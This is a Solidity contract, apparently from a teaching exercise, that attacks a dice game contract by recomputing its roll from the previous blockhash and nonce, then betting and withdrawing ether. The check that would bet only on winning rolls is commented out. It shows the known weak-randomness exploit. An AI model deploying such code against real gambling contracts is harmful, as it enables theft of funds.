// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "hardhat/console.sol";
import "./GiveMe7v1.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

error Hack__NotEnoguhEth();
error Hack__NotRolled7();
error Hack__TransferFailed();

contract RiggedRoll is Ownable {
    GiveMe7v1 public giveMe7v1;

    constructor(address payable gameAddress) {
        giveMe7v1 = GiveMe7v1(gameAddress);
    }

    receive() external payable {}

    function riggedRoll() public {
        if (address(this).balance < 0.002 ether) {
            revert Hack__NotEnoguhEth();
        }

        // uint256 nonce = giveMe7v1.getNonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(giveMe7v1), giveMe7v1.getNonce())
        );
        uint256 roll = uint256(hash) % 9;

        // if (roll != 7) {
        //     revert Hack__NotRolled7();
        // }

        console.log("Hack rolling the dice", roll);
        giveMe7v1.rollTheDice{value: 0.002 ether}();
    }

    function withdraw(address _addr, uint256 _amount) public payable onlyOwner {
        (bool success, ) = payable(_addr).call{value: _amount}("");
        if (!success) {
            revert Hack__TransferFailed();
        }
    }
}
